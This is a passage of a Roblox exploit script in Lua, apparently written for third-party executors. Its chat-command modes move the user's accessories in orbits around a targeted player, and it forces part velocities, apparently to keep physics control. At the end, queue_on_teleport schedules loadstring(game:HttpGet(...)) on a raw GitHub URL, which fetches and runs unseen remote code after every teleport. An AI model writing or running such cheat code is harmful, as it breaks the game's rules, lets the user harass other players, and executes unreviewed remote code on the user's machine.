        [4] = {offset = Vector3.new(0, 0, 0), r15part = "RightHand", r6part = "Right Arm"},
        [5] = {offset = Vector3.new(0, 0, 0), r15part = "LeftLowerLeg", r6part = "Left Leg"},
        [6] = {offset = Vector3.new(0, 0, 0), r15part = "RightLowerLeg", r6part = "Right Leg"}
    }

    oc = rs.Heartbeat:Connect(function()
        local ping = getPing()
        local pred = hr.Position

        local targetRootPos = hr.Position
        local targetLookVector = hr.CFrame.LookVector
        local baseOffsetPosition = pred + (-hr.CFrame.RightVector * 7) -- Position 5 studs to the left of predicted position
        local baseLookAtPosition = baseOffsetPosition + targetLookVector -- Point to the same direction as target

        local baseOffsetCFrame = CFrame.lookAt(baseOffsetPosition, baseLookAtPosition) -- Create CFrame looking in target's direction

        for i, hat in ipairs(acc) do
            local bodyPartData = bodyPartsConfig[i % #bodyPartsConfig + 1]
            if bodyPartData then
                local targetPart = ot.Character:FindFirstChild(bodyPartData.r15part) or ot.Character:FindFirstChild(bodyPartData.r6part)
                if targetPart then
                    local targetRootPartCFrame = hr.CFrame
                    local targetBodyPartCFrame = targetPart.CFrame
                    local relativeOffset = targetRootPartCFrame:ToObjectSpace(targetBodyPartCFrame) -- Get relative CFrame offset

                    local accessoryCFrame = baseOffsetCFrame * relativeOffset -- Apply relative offset to baseOffsetCFrame
                    hat.CFrame = accessoryCFrame
                end
            end
        end
    end)
    disableColl() 
    curMode = "copy"
end


local function orbitMode11() -- mode11
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    local oldOffset = offset

	local circle1 = {}
	local circle2 = {}
	for i, v in pairs(acc) do
		if (#circle1 < #acc / 2) then
			circle1[#circle1 + 1] = v
		else
			circle2[#circle2 + 1] = v
		end
	end

    oc = rs.Heartbeat:Connect(function()
        local angle = tick() * speed
        local ping = getPing()
		local pred=hr.Position -- Keep prediction for character target modes

        for i = 1, #circle1 do
            local x = -math.sin(angle + (i * angle)) * offset
            local y = math.cos(angle) / 2 * oldOffset
            local z = math.cos(angle + (i * -angle)) * offset

            offset = math.sin(angle) / 2 * oldOffset

            local off = CFrame.Angles(0, math.rad(hr.Orientation.Y), 0) * Vector3.new(x, height + y, z)
            local offWorld = computeOffset(hr, off)
            circle1[i].CFrame = CFrame.new(pred+offWorld)
        end

        for i = 1, #circle2 do
            local x = -math.sin(angle + (i * angle)) * offset
            local y = -math.cos(angle) / 2 * oldOffset
            local z = math.cos(angle + (i * angle)) * offset

            offset = math.sin(angle) / 2 * oldOffset

            local off = CFrame.Angles(0, math.rad(hr.Orientation.Y), 0) * Vector3.new(x, height + y, z)
            local offWorld = computeOffset(hr, off)
            circle2[i].CFrame = CFrame.new(pred+offWorld)
        end
        offset = oldOffset -- Restore offset for other modes
        if curMode ~= "mode11" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode11"
end


local function orbitMode12() -- mode12
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    local circle1 = {}
	local circle2 = {}
	for i, v in pairs(acc) do
		if (#circle1 < #acc / 2) then
			circle1[#circle1 + 1] = v
		else
			circle2[#circle2 + 1] = v
		end
	end

    oc = rs.Heartbeat:Connect(function()
        local angle = tick() * speed
        local ping = getPing()
		local pred=hr.Position -- Keep prediction for character target modes

        for i = 1, #circle1 do
            local x = math.sin(angle + (i * 5)) * offset
            local z = math.cos(angle + (i * 5)) * offset
            local off = CFrame.Angles(0, math.rad(hr.Orientation.Y), 0) * Vector3.new(x, height, z)
            local offWorld = computeOffset(hr, off)
            circle1[i].CFrame = CFrame.new(pred+offWorld)
        end

        for i = 1, #circle2 do
            local x = math.sin(angle + (i * 5)) * offset
            local z = math.cos(angle + (i * 5)) * offset
            local off = CFrame.Angles(0, math.rad(-hr.Orientation.Y), 0) * Vector3.new(x, height + 2, z)
            local offWorld = computeOffset(hr, off)
            circle2[i].CFrame = CFrame.new(pred+offWorld)
        end
        if curMode ~= "mode12" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode12"
end


local function orbitMode13() -- mode13
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    local circle1 = {}
	local circle2 = {}
	for i, v in pairs(acc) do
		if (#circle1 < #acc / 2) then
			circle1[#circle1 + 1] = v
		else
			circle2[#circle2 + 1] = v
		end
	end

    oc = rs.Heartbeat:Connect(function()
        local angle = tick() * speed
        local ping = getPing()
		local pred=hr.Position -- Keep prediction for character target modes

        for i = 1, #circle1 do
            local x = math.sin(angle + (i * 5)) * offset
            local z = math.cos(angle + (i * 5)) * offset
            local off = CFrame.Angles(0, math.rad(hr.Orientation.Y), 0) * Vector3.new(x + offset * 2, height, z)
            local offWorld = computeOffset(hr, off)
            circle1[i].CFrame = CFrame.new(pred+offWorld)
        end

        for i = 1, #circle2 do
            local x = math.sin(angle + (i * 5)) * offset
            local z = math.cos(angle + (i * 5)) * offset
            local off = CFrame.Angles(0, math.rad(hr.Orientation.Y), 0) * Vector3.new(x - offset * 2, height, z)
            local offWorld = computeOffset(hr, off)
            circle2[i].CFrame = CFrame.new(pred+offWorld)
        end
        if curMode ~= "mode13" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode13"
end


local function orbitMode14() -- mode14
    if not ot or not ot.Character then end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    oc = rs.Heartbeat:Connect(function()
        local angle = math.sin(tick()) * speed
        local ping = getPing()
		local pred=hr.Position -- Keep prediction for character target modes

        for i, v in pairs(acc) do
            local x = math.sin(angle * (i - 1)) * offset
            local y = math.sin(angle * (i - 1)) + ((i * height / 5) + angle)
            local z = math.cos(angle * (i - 1)) * offset
            local off = Vector3.new(x, y - 2, z)
            local offWorld = computeOffset(hr, off)
            v.CFrame = CFrame.new(pred+offWorld)
        end
        if curMode ~= "mode14" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode14"
end


local function orbitMode15() -- mode15
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    height = -1 -- Overriding global height for this mode, as in script 2

    oc = rs.Heartbeat:Connect(function()
        local ping = getPing()
		local pred=hr.Position -- Keep prediction for character target modes

        for i = 1, #acc do
            local off = CFrame.Angles(0, math.rad(hr.Orientation.Y), 0) * Vector3.new(0, height, -i * offset / 5)
            local offWorld = computeOffset(hr, off)
            acc[i].CFrame = CFrame.new(pred+offWorld)
        end
        if curMode ~= "mode15" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode15"
end


local function orbitMode16() -- mode16
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    oc = rs.Heartbeat:Connect(function()
        local ping = getPing()
		local pred=hr.Position -- Keep prediction for character target modes

        for i, v in pairs(acc) do
            local x = math.cos(math.random(1, 255) + (i + 1)) * offset
            local z = math.sin(math.random(1, 255) + (i + 1)) * offset

            local m = math.random(1, 13)
            local posOffset = Vector3.new(0,0,0)
            if m == 1 then
                posOffset = Vector3.new(x, height, z)
            elseif m == 2 then
                posOffset = Vector3.new(z, height, x)
            elseif m == 3 then
                posOffset = Vector3.new(-x, height, z)
            elseif m == 4 then
                posOffset = Vector3.new(x, height, -z)
            elseif m == 5 then
                posOffset = Vector3.new(x, z, z)
            elseif m == 6 then
                posOffset = Vector3.new(x, x, z)
            elseif m == 7 then
                posOffset = Vector3.new(-x, x, z)
            elseif m == 8 then
                posOffset = Vector3.new(x, -x, z)
            elseif m == 9 then
                posOffset = Vector3.new(x, x, -z)
            elseif m == 10 then
                posOffset = Vector3.new(-x, z, z)
            elseif m == 11 then
                posOffset = Vector3.new(x, -z, z)
            elseif m == 12 then
                posOffset = Vector3.new(x, z, -z)
            elseif m == 13 then
                posOffset = Vector3.new(z, z, z)
            end
            local offWorld = computeOffset(hr, posOffset)
            v.CFrame = CFrame.new(pred+offWorld)
        end
        if curMode ~= "mode16" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode16"
end


local function orbitMode17() -- mode17
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    local circle1 = {}
	local circle2 = {}

	local offset2 = 0
	local height2 = 0

	for i, v in pairs(acc) do
		if (#circle1 < #acc / 2) then
			circle1[#circle1 + 1] = v
		else
			circle2[#circle2 + 1] = v
		end
	end

    oc = rs.Heartbeat:Connect(function()
        local angle = tick() * speed + 1
        offset2 = math.sin(angle) * offset
		height2 = math.cos(angle) * height
        local ping = getPing()
		local pred=hr.Position -- Keep prediction for character target modes

        for i = 1, #circle1 do
            local x = math.cos(angle + (i * #acc)) * offset2 / 2
            local z = math.sin(angle + (i * #acc)) * offset2 / 2

            local off = Vector3.new(x, -height2, z)
            local offWorld = computeOffset(hr, off)
            circle1[i].CFrame = CFrame.new(pred+offWorld)
        end

        for i = 1, #circle2 do
            local x = math.cos(angle + (i * #acc)) * offset2 / 2
            local z = math.sin(angle + (i * #acc)) * offset2 / 2
            local off = Vector3.new(x, height2, z)
            local offWorld = computeOffset(hr, off)
            circle2[i].CFrame = CFrame.new(pred+offWorld)
        end
        if curMode ~= "mode17" then
            stopOrbit()
        end
    end)
    disableColl() curMode = "mode17"
end
local function orbitMode18() -- mode18: Tornado/Vortex
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    oc = rs.Heartbeat:Connect(function()
        local base = tick() * speed
        local ping = getPing()
        local pred = hr.Position
        local n = #acc

        for i, h in ipairs(acc) do
            local angle = base + (i * (2 * math.pi / n))
            local normalizedIndex = (i - 1) / (n - 1) -- Normalize index to 0-1
            local vortexHeight = normalizedIndex * height -- Height increases with index
            local vortexRadius = r * (1 - normalizedIndex * 0.8) -- Radius decreases with index
            local off = Vector3.new(math.cos(angle) * vortexRadius, vortexHeight, math.sin(angle) * vortexRadius)
            local offWorld = computeOffset(hr, off)
            h.CFrame = CFrame.new(pred+offWorld)
        end
    end)
    disableColl() curMode = "mode18"
end


local function orbitMode19() -- mode19: Pulse
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    oc = rs.Heartbeat:Connect(function()
        local base = tick() * speed
        local ping = getPing()
        local pred = hr.Position
        local n = #acc
        local pulseFactor = math.sin(tick() * speed * 0.5) * 0.5 + 1 -- Oscillates between 0.5 and 1.5

        for i, h in ipairs(acc) do
            local angle = base + (i * (2 * math.pi / n))
            local currentRadius = r * pulseFactor
            local off = Vector3.new(math.cos(angle) * currentRadius, 0, math.sin(angle) * currentRadius)
            local offWorld = computeOffset(hr, off)
            h.CFrame = CFrame.new(pred+offWorld)
        end
    end)
    disableColl() curMode = "mode19"
end


local function orbitMode20() -- mode20: DNA/Double Helix
    if not ot or not ot.Character then return end
	local hr = ot.Character:FindFirstChild("HumanoidRootPart")
	if not hr then return end
	respActive=true; coroutine.wrap(respLoop)()
    local helixOffset = r * 0.5 -- Spacing between helixes

    oc = rs.Heartbeat:Connect(function()
        local base = tick() * speed
        local ping = getPing()
        local pred = hr.Position
        local n = #acc

        for i, h in ipairs(acc) do
            local angle = base + (i * (2 * math.pi / n)) * 2 -- Double the angle for helixes
            local helixRadius = r
            local helixHeight = math.sin(angle * 2) * height * 0.5 -- Vertical wave for helix shape

            local xOffset = (i % 2 == 0) and helixOffset or -helixOffset -- Alternate helix sides
            local off = Vector3.new(math.cos(angle) * helixRadius + xOffset, helixHeight, math.sin(angle) * helixRadius)
            local offWorld = computeOffset(hr, off)
            h.CFrame = CFrame.new(pred+offWorld)
        end
    end)
    disableColl() curMode = "mode20"
end


local function handleCmd(pl, msg)
	if pl.Name==owner and msg:sub(1,#pre)==pre then
		local args = msg:sub(#pre+1):split(" ")
		local cmd = args[1]:lower()
		local targ = args[2] or (ot and ot.Name) or "me"
		if cmd=="come" then
			if pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
				lp.Character:MoveTo(pl.Character.HumanoidRootPart.Position)
			end
		elseif cmd=="stop" then
			stopOrbit()
		elseif cmd=="speed" then
			sp = tonumber(args[2]) or sp
            speed = sp -- Update script 2 style speed variable
		elseif cmd=="range" then
			r = tonumber(args[2]) or r
            offset = r -- Update script 2 style offset variable
		elseif cmd=="height" then -- New command to control height
			oh = tonumber(args[2]) or oh
            height = oh -- Update script 2 style height variable
		elseif cmd=="h" then
			if curMode~="h" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitDef() end end
		elseif cmd=="w" then
			if curMode~="w" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitWave() end end
		elseif cmd=="8" then -- Removed Mode 8 Command
		elseif cmd=="sp" then
			if curMode~="sp" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitSpiral() end end
		elseif cmd=="dy3" then
			if curMode~="dy3" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitDyn3() end end
		elseif cmd=="swr" then
			if curMode~="swr" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitSwirl() end end
		elseif cmd=="in" then
			if curMode~="in" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitInf() end end
		elseif cmd=="sw" then
			if curMode~="sw" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitSin() end end
		elseif cmd=="hx" then
			if curMode~="hx" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitStar() end end
		elseif cmd=="f" then
			if curMode~="f" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitFlower() end end
		elseif cmd=="we" then
			if curMode~="we" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitWeave() end end
		elseif cmd=="heart" then
			if curMode~="heart" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitHeart() end end
		elseif cmd=="wings" then
			if curMode~="wings" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitWings() end end
		elseif cmd=="dragon" then
			if curMode~="dragon" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitDragon() end end
        -- New Modes from Script 2
        elseif cmd=="mode2" then
			if curMode~="mode2" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode2() end end
        elseif cmd=="mode3" then
			if curMode~="mode3" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode3() end end
        elseif cmd=="mode4" then
			if curMode~="mode4" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode4() end end
        elseif cmd=="mode5" then
			if curMode~="mode5" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode5() end end
        elseif cmd=="mode6" then
			if curMode~="mode6" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode6() end end
        elseif cmd=="mode7" then
			if curMode~="mode7" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode7() end end
        elseif cmd=="mode18" then -- New Tornado Mode
			if curMode~="mode18" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode18() end end -- orbitMode8 is now Tornado
        elseif cmd=="mode19" then -- New Pulse Mode
			if curMode~="mode19" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode19() end end -- orbitMode9 is now Pulse
        elseif cmd=="mode20" then -- New DNA Mode
			if curMode~="mode20" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode20() end end -- orbitMode10 is now DNA
        elseif cmd=="mode11" then
			if curMode~="mode11" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode11() end end
        elseif cmd=="mode12" then
			if curMode~="mode12" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode12() end end
        elseif cmd=="mode13" then
			if curMode~="mode13" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode13() end end
        elseif cmd=="mode14" then
			if curMode~="mode14" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode14() end end
        elseif cmd=="mode15" then
			if curMode~="mode15" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode15() end end
        elseif cmd=="mode16" then
			if curMode~="mode16" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode16() end end
        elseif cmd=="mode17" then
			if curMode~="mode17" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitMode17() end end
		-- New Modes Commands
		elseif cmd=="hexagon" then
			if curMode~="hexagon" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitModeHexagon() end end
		elseif cmd=="snake" then
			if curMode~="snake" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitModeSnake() end end
		elseif cmd=="wingsv2" then
			if curMode~="wingsv2" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitWingsV2() end end
		elseif cmd=="wingsv3" then
			if curMode~="wingsv3" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitWingsV3() end end
		elseif cmd=="wingsv4" then
			if curMode~="wingsv4" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitWingsV4() end end
		elseif cmd=="wingsv5" then
			if curMode~="wingsv5" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitWingsV5() end end
		elseif cmd=="copy" then
			if curMode~="copy" then stopOrbit() ot = getTarg(targ, pl) if ot then orbitBodyPartCopy() end end
		end
	end
end

local function listen()
	for _,pl in ipairs(p:GetPlayers()) do
		pl.Chatted:Connect(function(m) handleCmd(pl, m) end)
	end
	p.PlayerAdded:Connect(function(pl)
		pl.Chatted:Connect(function(m) handleCmd(pl, m) end)
	end)
	p.PlayerRemoving:Connect(function(pl)
		if pl==ot then stopOrbit() end
	end)
end

listen()
getAcc()

if lp.Character then
	for i,v in pairs(lp.Character:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then
			rs.Heartbeat:Connect(function()
				v.Velocity = Vector3.new(-30,0,0)
			end)
		end
	end
end
end)

-- Minimized state toggler (restore button when minimized)
local restoreButton = Instance.new("TextButton")
restoreButton.Size = UDim2.new(0, 60, 0, 25)
restoreButton.Position = UDim2.new(0.5, -30, 0, 10)
restoreButton.Text = "Restore"
restoreButton.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
restoreButton.TextColor3 = Color3.fromRGB(255, 255, 255)
restoreButton.Visible = false
restoreButton.Parent = gui
restoreButton.MouseButton1Click:Connect(function()
    local tween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -125, 0.5, -90)})
    tween:Play()
    frame.Visible = true
    restoreButton.Visible = false
end)

minimize.MouseButton1Click:Connect(function()
    local tween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -125, 1.2, 0)})
    tween:Play()
    tween.Completed:Connect(function()
        frame.Visible = false
        restoreButton.Visible = true
    end)
end)


local queue_on_teleport = queue_on_teleport or syn.queue_on_teleport or fluxus.queue_on_teleport

if queue_on_teleport then
    queue_on_teleport([[ 
	wait(10)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxi123/sdfsdgghfdADASFHGFDH/refs/heads/main/dsfgsdgdsdsg2.luau"))() 
    ]])
else
    warn("Your executor does not support queue_on_teleport.")
end
